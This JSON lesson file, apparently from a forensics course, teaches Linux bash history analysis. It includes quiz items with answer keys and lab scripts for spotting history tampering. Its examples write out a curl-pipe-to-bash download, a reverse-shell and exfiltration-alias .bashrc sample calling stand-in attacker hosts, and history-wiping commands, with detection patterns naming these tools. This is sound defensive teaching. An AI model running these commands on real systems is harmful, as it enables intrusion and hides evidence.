{
  "lesson_id": "e5f6a7b8-c9d0-4e1f-2a3b-4c5d6e7f8a9b",
  "domain": "dfir",
  "title": "Linux Shells and Command History Forensics",
  "difficulty": 2,
  "order_index": 75,
  "prerequisites": [
    "d4e5f6a7-b8c9-4d0e-1f2a-3b4c5d6e7f8a"
  ],
  "concepts": [
    "Bash history files and configuration",
    "Command history forensics and analysis",
    "History file tampering detection",
    "Shell configuration files (.bashrc, .profile)",
    "Command timestamps and session reconstruction",
    "History evasion techniques",
    "Alternative shells (zsh, fish, tcsh)",
    "Real-time command logging",
    "Rootkit detection via command history"
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Master forensic analysis of bash history files across all user accounts",
    "Reconstruct attacker activity timelines from command history",
    "Detect history file tampering and evasion techniques",
    "Analyze shell configuration files for persistence mechanisms",
    "Understand limitations of history files and alternative logging methods",
    "Identify anti-forensic techniques used by sophisticated attackers"
  ],
  "post_assessment": [
    {
      "question": "What environment variable controls how many commands are stored in bash history?",
      "options": [
        "HISTSIZE",
        "HISTFILESIZE",
        "HISTFILE",
        "HISTCONTROL"
      ],
      "correct_answer": 0,
      "explanation": "HISTSIZE controls the number of commands stored in memory during the session, while HISTFILESIZE controls how many are saved to the .bash_history file. Both work together to determine history retention.",
      "question_id": "d659215b-3172-4b9f-94e9-595283a9648b",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "Which HISTCONTROL setting prevents commands starting with a space from being logged?",
      "options": [
        "erasedups",
        "ignorespace",
        "ignoreboth",
        "ignoredups"
      ],
      "correct_answer": 1,
      "explanation": "HISTCONTROL=ignorespace causes bash to ignore commands that start with a space. Attackers exploit this by prefixing malicious commands with spaces. 'ignoreboth' combines 'ignorespace' and 'ignoredups'.",
      "question_id": "bdb9fa10-33c4-4888-bd49-d2b402d4e6b2",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "What is the forensic significance of finding 'unset HISTFILE' in a user's .bashrc?",
      "options": [
        "Normal configuration",
        "Performance optimization",
        "Anti-forensic technique to prevent history logging",
        "Error in configuration"
      ],
      "correct_answer": 2,
      "explanation": "'unset HISTFILE' completely disables history logging by removing the variable that points to the history file. This is a strong indicator of anti-forensic intent, often added by attackers.",
      "question_id": "e66fe268-cd8d-410d-b332-238cf437e935",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "When does bash write commands to .bash_history?",
      "options": [
        "Immediately after each command",
        "Every 5 minutes",
        "Only when the shell exits normally",
        "When HISTSIZE is reached"
      ],
      "correct_answer": 2,
      "explanation": "By default, bash only writes history to .bash_history when the shell exits normally (logout, exit command). If a session is killed or crashes, the history is lost unless 'shopt -s histappend' is configured.",
      "question_id": "3eabb0be-89a4-4abf-86b7-ff861e861355",
      "type": "multiple_choice",
      "difficulty": 2
    },
    {
      "question": "What does finding 'PROMPT_COMMAND=\"history -c\"' in .bashrc indicate?",
      "options": [
        "Automatic history backup",
        "History compression",
        "History cleared after every command (anti-forensic)",
        "History synced to server"
      ],
      "correct_answer": 2,
      "explanation": "PROMPT_COMMAND executes after every command. 'history -c' clears all history. Combined, this creates an environment where no command history is retained - a clear anti-forensic measure.",
      "question_id": "befa4066-9f4b-4861-a510-c32f06a62673",
      "type": "multiple_choice",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "teach_like_im_10",
    "memory_hooks",
    "minimum_effective_dose",
    "meta_learning",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "content": {
        "text": "## Welcome to Command History Forensics! üïµÔ∏è\n\n**Imagine this**: You're investigating a breach. You've found suspicious accounts (Lesson 74). You've identified unusual file permissions (Lesson 73). Now comes the moment of truth:\n\n**What did the attacker actually DO on this system?**\n\nCommand history files are like the **security camera footage** of Linux systems. Every command typed by every user - potentially recorded and waiting for you to analyze.\n\n**Why this is one of the most powerful forensic artifacts**:\n\n- Shows **attacker behavior** (reconnaissance, exploitation, data exfiltration)\n- Reveals **tools and techniques** (wget malware.sh, nc -e /bin/bash)\n- Provides **timeline** of activity (when combined with timestamps)\n- Exposes **mistakes** attackers make (typos, testing, comments)\n- Identifies **persistence mechanisms** (cron jobs, startup scripts)\n\n**Real case example**: In a 2020 healthcare breach, the attacker's bash history showed:\n```bash\nwhoami\nid\nsudo su -\nfind / -name \"*.db\" 2>/dev/null\ntar czf patient_data.tar.gz /var/db/patients/\npython3 -m http.server 8000\n# Patient database exfiltrated to 45.123.67.89\n```\n\nEvery step of the attack - **documented by the attacker themselves**!\n\n**But here's the challenge**: Sophisticated attackers know about history files. They:\n- Disable history logging\n- Clear history after their activities\n- Use anti-forensic techniques\n- Manipulate timestamps\n\n**Your job**: Learn both **what to look for** AND **what to look for when attackers try to hide**.\n\n**Jim Kwik principle - Minimum Effective Dose**: I'll teach you the 20% of history forensics techniques that solve 80% of real cases. Master these, and you'll reconstruct most attacks successfully.\n\nLet's uncover what attackers tried to hide! üîçüéØ"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "# Understanding Linux Command History Architecture\n\n## The Bash History System\n\n**Bash** (Bourne Again Shell) is the default shell on most Linux systems. It maintains command history through several components:\n\n### 1. History Storage Locations\n\n**In-Memory History**:\n- Current shell session commands stored in RAM\n- Managed by `HISTSIZE` variable\n- Accessible via `history` command\n- Lost if session crashes or is killed\n\n**On-Disk History**:\n- Written to `~/.bash_history` (default location)\n- Managed by `HISTFILESIZE` variable\n- Persists between sessions\n- Written when shell exits normally\n\n```\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ         User Session (RAM)              ‚îÇ\n‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ\n‚îÇ  ‚îÇ   In-Memory History Buffer        ‚îÇ ‚îÇ\n‚îÇ  ‚îÇ   (HISTSIZE = 1000 commands)      ‚îÇ ‚îÇ\n‚îÇ  ‚îÇ                                   ‚îÇ ‚îÇ\n‚îÇ  ‚îÇ   $ ls -la                        ‚îÇ ‚îÇ\n‚îÇ  ‚îÇ   $ cd /tmp                       ‚îÇ ‚îÇ\n‚îÇ  ‚îÇ   $ whoami                        ‚îÇ ‚îÇ\n‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ\n‚îÇ                  ‚Üì                      ‚îÇ\n‚îÇ         (on shell exit)                 ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n                  ‚Üì\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ       ~/.bash_history (Disk)            ‚îÇ\n‚îÇ  (HISTFILESIZE = 2000 lines)            ‚îÇ\n‚îÇ                                         ‚îÇ\n‚îÇ  Previous commands from past sessions   ‚îÇ\n‚îÇ  + new commands from this session       ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\n**Critical Forensic Point**: If a session is killed (kill -9, system crash, power loss), in-memory history is **never written** to .bash_history!\n\n### 2. Key Environment Variables\n\n**HISTFILE**:\n- Location of history file\n- Default: `~/.bash_history`\n- Can be changed: `export HISTFILE=~/.hidden_history`\n- **If unset**: No history is saved to disk!\n\n```bash\n# Check current setting\necho $HISTFILE\n# Output: /home/user/.bash_history\n\n# Anti-forensic technique (disable history)\nunset HISTFILE\n# Now NO commands will be saved to disk\n```\n\n**HISTSIZE**:\n- Number of commands in memory (current session)\n- Default: 500-1000 (varies by distribution)\n- Set to 0 to disable: `export HISTSIZE=0`\n\n```bash\n# Check current setting\necho $HISTSIZE\n# Output: 1000\n\n# Increase for better forensics\nexport HISTSIZE=10000\n```\n\n**HISTFILESIZE**:\n- Maximum lines in ~/.bash_history file\n- Default: 500-2000 (varies by distribution)\n- Old commands deleted when limit reached\n\n```bash\n# Check current setting\necho $HISTFILESIZE\n# Output: 2000\n\n# Increase retention\nexport HISTFILESIZE=100000\n```\n\n**HISTCONTROL**:\n- Controls what commands are saved\n- **Critical for anti-forensics**\n\nValues:\n- `ignorespace` - Ignore commands starting with space\n- `ignoredups` - Ignore duplicate consecutive commands\n- `ignoreboth` - Both of the above\n- `erasedups` - Remove all previous duplicates\n\n```bash\n# Check current setting\necho $HISTCONTROL\n# Output: ignoreboth\n\n# Anti-forensic exploitation:\nexport HISTCONTROL=ignorespace\n curl http://malicious.com/malware.sh | bash\n# ‚Üë Note leading space - command NOT logged!\n```\n\n**HISTTIMEFORMAT**:\n- Adds timestamps to history\n- **Not enabled by default!**\n- When enabled: Shows when commands were executed\n\n```bash\n# Enable timestamps\nexport HISTTIMEFORMAT=\"%F %T \"\n\n# Now history shows:\n# 1234  2023-10-15 14:23:17 whoami\n# 1235  2023-10-15 14:23:22 id\n```\n\n**Forensic gold mine when enabled, but rare!**\n\n### 3. Shell Configuration Files\n\nThese files control history behavior and may contain persistence mechanisms:\n\n**System-wide** (affect all users):\n- `/etc/profile` - Executed for login shells\n- `/etc/bash.bashrc` (Debian/Ubuntu) or `/etc/bashrc` (RHEL/CentOS)\n\n**Per-user** (in user's home directory):\n- `~/.bash_profile` - Login shells (SSH, console login)\n- `~/.bashrc` - Non-login interactive shells\n- `~/.profile` - Used if .bash_profile doesn't exist\n- `~/.bash_logout` - Executed when shell exits\n- `~/.bash_aliases` - Alias definitions\n\n**Loading order for login shells**:\n```\n1. /etc/profile\n2. ~/.bash_profile (if exists)\n   OR ~/.bash_login (if .bash_profile doesn't exist)\n   OR ~/.profile (if neither above exist)\n3. ~/.bashrc (usually sourced from .bash_profile)\n```\n\n**Forensic importance**:\n- Attackers modify these to:\n  - Disable history logging\n  - Set HISTFILESIZE=0\n  - Add malicious aliases\n  - Establish persistence (run backdoors at login)\n\n**Example - Attacker-modified ~/.bashrc**:\n```bash\n# Normal content\nexport PATH=/usr/local/bin:/usr/bin:/bin\n\n# Malicious additions (attacker inserted):\nexport HISTFILE=/dev/null  # History goes to black hole\nexport HISTSIZE=0  # Don't store history in memory\nalias sudo=\"bash -c 'curl http://exfil.com?cmd=$BASH_COMMAND' && sudo\"  # Exfiltrate all sudo commands\n\n# Backdoor persistence\n(nc -e /bin/bash attacker.com 4444 &) 2>/dev/null  # Reverse shell on login\n```\n\n### 4. History Appending vs Overwriting\n\n**Default behavior (histappend OFF)**:\n- Last closed shell **overwrites** .bash_history\n- Multiple concurrent shells = history from only one survives\n\n**With histappend ON**:\n- Each shell **appends** to .bash_history\n- Multiple concurrent shells = all history preserved\n\n```bash\n# Check status\nshopt histappend\n# Output: histappend on (or off)\n\n# Enable appending\nshopt -s histappend\n\n# Add to ~/.bashrc to make permanent\necho 'shopt -s histappend' >> ~/.bashrc\n```\n\n**Forensic scenario**:\n```\nAttacker scenario 1 (histappend OFF):\n- Attacker SSH session 1 (runs malicious commands)\n- Victim SSH session 2 (normal admin work)\n- Session 2 closes last ‚Üí overwrites history with benign commands\n- Attacker's commands: LOST\n\nAttacker scenario 2 (histappend ON):\n- Both sessions append to history\n- All commands preserved\n- Attacker's commands: RECOVERABLE\n```\n\n**Recommendation**: Always enable histappend for better forensics.\n\n## History Commands and Their Forensic Uses\n\n**View history**:\n```bash\nhistory           # Show all in-memory history with line numbers\nhistory 10        # Show last 10 commands\nhistory | grep ssh  # Search history for 'ssh'\n```\n\n**Execute from history**:\n```bash\n!123              # Execute command number 123\n!!                # Execute previous command\n!-2               # Execute command 2 lines ago\n!ssh              # Execute most recent command starting with 'ssh'\n```\n\n**Modify history**:\n```bash\nhistory -c        # Clear in-memory history (anti-forensic!)\nhistory -w        # Write in-memory history to HISTFILE now\nhistory -a        # Append new commands to HISTFILE\nhistory -d 123    # Delete command number 123\n```\n\n**Anti-forensic commands you'll see attackers use**:\n```bash\nhistory -c && rm ~/.bash_history  # Nuclear option - destroy all history\nhistory -d 1234   # Delete single incriminating command\nhistory -d $(history | tail -1 | awk '{print $1}')  # Delete this command itself\n```\n\n## Alternative Shells and Their History Files\n\nNot all systems use bash. Different shells = different history files:\n\n```\n‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê\n‚îÇ Shell       ‚îÇ History File        ‚îÇ Notes            ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ bash        ‚îÇ ~/.bash_history     ‚îÇ Most common      ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ zsh         ‚îÇ ~/.zsh_history      ‚îÇ Growing in       ‚îÇ\n‚îÇ             ‚îÇ ~/.zhistory         ‚îÇ popularity       ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ fish        ‚îÇ ~/.local/share/     ‚îÇ Modern shell     ‚îÇ\n‚îÇ             ‚îÇ fish/fish_history   ‚îÇ                  ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ tcsh/csh    ‚îÇ ~/.history          ‚îÇ Less common      ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ ksh         ‚îÇ ~/.sh_history       ‚îÇ Legacy systems   ‚îÇ\n‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§\n‚îÇ sh (dash)   ‚îÇ No history          ‚îÇ Minimal shell    ‚îÇ\n‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò\n```\n\n**Forensic tip**: Always check:\n```bash\n# What shells are available?\ncat /etc/shells\n\n# What shell does each user use?\nawk -F: '{print $1, $7}' /etc/passwd\n\n# Check all possible history files\nfind /home -name \".*history\" 2>/dev/null\nfind /root -name \".*history\" 2>/dev/null\n```\n\n## Forensic Timeline Challenges\n\n**Problem**: .bash_history has **NO timestamps by default**!\n\nYou see:\n```\nls -la\ncd /tmp\nwget http://malicious.com/shell.sh\nbash shell.sh\n```\n\nBut you **don't know**:\n- When were these executed?\n- In what order (file could be modified)?\n- By which session?\n\n**Solution 1: HISTTIMEFORMAT** (if enabled)\n```bash\nexport HISTTIMEFORMAT=\"%F %T \"\nhistory\n# Output:\n# 1234  2023-10-15 14:23:17 wget http://malicious.com/shell.sh\n```\n\n**Solution 2: Correlation with other artifacts**\n- File system timestamps (when was shell.sh created?)\n- Auth logs (when did user log in?)\n- Process accounting (if enabled)\n- Network logs (when was malicious.com contacted?)\n\n**Solution 3: File modification time**\n```bash\nstat ~/.bash_history\n# Modification time = last time file was written\n# (usually when last shell exited)\n```\n\n**Forensic reality**: Perfect timelines are rare. You'll piece together evidence from multiple sources."
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "# Hands-On: Command History Forensics Lab\n\n## Exercise 1: Basic History Enumeration\n\n**Scenario**: You're investigating all user accounts on a compromised system.\n\n**Step 1: Find all history files**\n```bash\n# Find bash history files\nsudo find /home -name \".bash_history\" 2>/dev/null\nsudo find /root -name \".bash_history\" 2>/dev/null\n\n# Find ALL shell history files (any shell)\nsudo find / -type f -name \".*history\" 2>/dev/null\n\n# Count commands per user\nfor user_home in /home/* /root; do\n  history_file=\"$user_home/.bash_history\"\n  if [ -f \"$history_file\" ]; then\n    count=$(wc -l < \"$history_file\")\n    echo \"$(basename $user_home): $count commands\"\n  fi\ndone\n```\n\n**Step 2: Check file metadata**\n```bash\n# When was history last modified?\nsudo stat /home/suspicious_user/.bash_history\n\n# Look for:\n# - Modification time (when last shell exited)\n# - Size (0 bytes = cleared or disabled)\n# - Permissions (should be 600)\n```\n\n**Red flags**:\n- History file is 0 bytes (cleared)\n- History file is missing (deleted)\n- Very few commands (<50) for active account\n- Recent modification time matches intrusion timeframe\n\n---\n\n## Exercise 2: Searching for Malicious Commands\n\n**Common attacker commands to search for**:\n\n```bash\n# Create comprehensive search script\n#!/bin/bash\n# search_malicious_history.sh\n\nHISTORY_FILE=\"$1\"\n\nif [ ! -f \"$HISTORY_FILE\" ]; then\n  echo \"Usage: $0 /path/to/.bash_history\"\n  exit 1\nfi\n\necho \"[*] Analyzing: $HISTORY_FILE\"\necho \"\"\n\n# Network activity\necho \"[+] Network commands:\"\ngrep -E \"wget|curl|nc|netcat|ncat|socat|telnet|ftp\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# Download and execute\necho \"[+] Download & execute patterns:\"\ngrep -E \"\\| bash|\\| sh|curl.*\\|.*bash|wget.*\\|.*sh\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# Privilege escalation\necho \"[+] Privilege escalation attempts:\"\ngrep -E \"sudo|su -|pkexec|passwd\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# User/group manipulation\necho \"[+] User/group modifications:\"\ngrep -E \"useradd|usermod|groupadd|groupmod|adduser\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# File manipulation\necho \"[+] Sensitive file access:\"\ngrep -E \"/etc/passwd|/etc/shadow|/etc/sudoers|authorized_keys\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# Reconnaissance\necho \"[+] Reconnaissance commands:\"\ngrep -E \"whoami|id|uname|hostname|ifconfig|ip addr|netstat|ss |ps aux|w |who\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# Data exfiltration\necho \"[+] Data exfiltration indicators:\"\ngrep -E \"tar.*czf|zip|scp|rsync|base64.*encode|xxd\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# History tampering\necho \"[+] History manipulation:\"\ngrep -E \"history -c|history -d|unset.*HIST|rm.*history|HISTFILE|HISTSIZE=0\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\n# Persistence mechanisms\necho \"[+] Persistence mechanisms:\"\ngrep -E \"crontab|systemctl.*enable|rc.local|.bashrc|.profile|authorized_keys|ssh.*key\" \"$HISTORY_FILE\" || echo \"  None found\"\necho \"\"\n\necho \"[*] Analysis complete\"\n```\n\n**Usage**:\n```bash\nsudo ./search_malicious_history.sh /home/attacker/.bash_history\n```\n\n---\n\n## Exercise 3: Detecting History Tampering\n\n**Indicators of tampered history**:\n\n**Check 1: History configuration in shell config files**\n```bash\n# Check for anti-forensic settings\nsudo grep -E \"HIST|history\" /home/user/.bashrc /home/user/.bash_profile /home/user/.profile\n\n# Red flags:\n# - export HISTFILE=/dev/null\n# - export HISTSIZE=0\n# - unset HISTFILE\n# - history -c (in PROMPT_COMMAND)\n```\n\n**Check 2: Compare history size to account activity**\n```bash\n# How long has account existed?\nsudo stat /home/user | grep Birth\n\n# How many commands in history?\nwc -l /home/user/.bash_history\n\n# Analysis:\n# - Account 6 months old with only 20 commands = SUSPICIOUS\n# - Active admin account with no history = SUSPICIOUS\n```\n\n**Check 3: Look for history clearing commands**\n```bash\n# Ironically, history clearing attempts sometimes logged\nsudo grep -E \"history -c|history -d|> .bash_history|rm.*history\" /home/user/.bash_history\n```\n\n**Check 4: File metadata anomalies**\n```bash\n# History file timestamp AFTER last login?\n# (Indicates manual modification)\nLAST_LOGIN=$(sudo lastlog -u username | tail -1 | awk '{print $4, $5, $6, $9}')\nHIST_MTIME=$(stat -c '%y' /home/username/.bash_history)\necho \"Last login: $LAST_LOGIN\"\necho \"History modified: $HIST_MTIME\"\n# If history modified AFTER last login ‚Üí manually tampered\n```\n\n---\n\n## Exercise 4: Timeline Reconstruction\n\n**Scenario**: Reconstruct attack timeline from history (no timestamps available)\n\n**Technique: Cross-reference with file system artifacts**\n\n```bash\n#!/bin/bash\n# timeline_reconstruction.sh\n\nUSER=\"attacker\"\nHOME=\"/home/$USER\"\nHISTORY=\"$HOME/.bash_history\"\n\necho \"[*] Timeline Reconstruction for $USER\"\necho \"\"\n\n# Step 1: When did user last login?\necho \"[+] Last login:\"\nsudo lastlog -u $USER\necho \"\"\n\n# Step 2: When was history file last modified?\necho \"[+] History file last modified:\"\nstat -c '%y' $HISTORY\necho \"\"\n\n# Step 3: Extract commands that created files\necho \"[+] Commands that likely created files:\"\ngrep -E \"wget|curl|touch|echo.*>|cat.*>|cp|mv\" $HISTORY | while read cmd; do\n  echo \"  Command: $cmd\"\n  \n  # Try to find created files\n  if echo \"$cmd\" | grep -q wget; then\n    FILE=$(echo \"$cmd\" | grep -oE \"https?://[^ ]+\" | xargs basename)\n    if [ -f \"$HOME/$FILE\" ]; then\n      echo \"    File: $HOME/$FILE\"\n      echo \"    Created: $(stat -c '%y' $HOME/$FILE)\"\n    fi\n  fi\n  echo \"\"\ndone\n\n# Step 4: Correlate with auth logs\necho \"[+] Login sessions (from auth.log):\"\nsudo grep \"$USER.*session opened\" /var/log/auth.log | tail -10\necho \"\"\n\necho \"[*] Cross-reference history commands with file timestamps to build timeline\"\n```\n\n**Manual analysis**:\n1. List all commands: `cat ~/.bash_history`\n2. For each command, check if it created files\n3. Use file timestamps to order commands chronologically\n4. Build attack timeline\n\n---\n\n## Exercise 5: Analyzing Shell Configuration for Persistence\n\n**Check all shell config files for malicious modifications**:\n\n```bash\n#!/bin/bash\n# audit_shell_configs.sh\n\nUSER=\"$1\"\nHOME=$(eval echo ~$USER)\n\necho \"[*] Auditing shell configuration for $USER\"\necho \"\"\n\nCONFIG_FILES=\"\n$HOME/.bashrc\n$HOME/.bash_profile\n$HOME/.profile\n$HOME/.bash_aliases\n$HOME/.bash_logout\n/etc/profile\n/etc/bash.bashrc\n/etc/bashrc\n\"\n\nfor config in $CONFIG_FILES; do\n  if [ -f \"$config\" ]; then\n    echo \"[+] Checking: $config\"\n    \n    # Check for history manipulation\n    if grep -q \"HISTFILE\" \"$config\"; then\n      echo \"  [!] HISTFILE setting found:\"\n      grep \"HISTFILE\" \"$config\" | sed 's/^/      /'\n    fi\n    \n    if grep -q \"HISTSIZE\" \"$config\"; then\n      echo \"  [!] HISTSIZE setting found:\"\n      grep \"HISTSIZE\" \"$config\" | sed 's/^/      /'\n    fi\n    \n    if grep -q \"history -c\" \"$config\"; then\n      echo \"  [!!] ALERT: History clearing detected:\"\n      grep \"history\" \"$config\" | sed 's/^/      /'\n    fi\n    \n    # Check for suspicious aliases\n    echo \"  [*] Aliases:\"\n    grep \"^alias\" \"$config\" | sed 's/^/      /'\n    \n    # Check for network commands (potential backdoors)\n    if grep -qE \"nc |ncat |socat |telnet |curl.*\\|.*bash\" \"$config\"; then\n      echo \"  [!!] ALERT: Network command in config:\"\n      grep -E \"nc |ncat |socat |telnet |curl.*\\|.*bash\" \"$config\" | sed 's/^/      /'\n    fi\n    \n    # Check for cron jobs\n    if grep -qE \"crontab|cron\" \"$config\"; then\n      echo \"  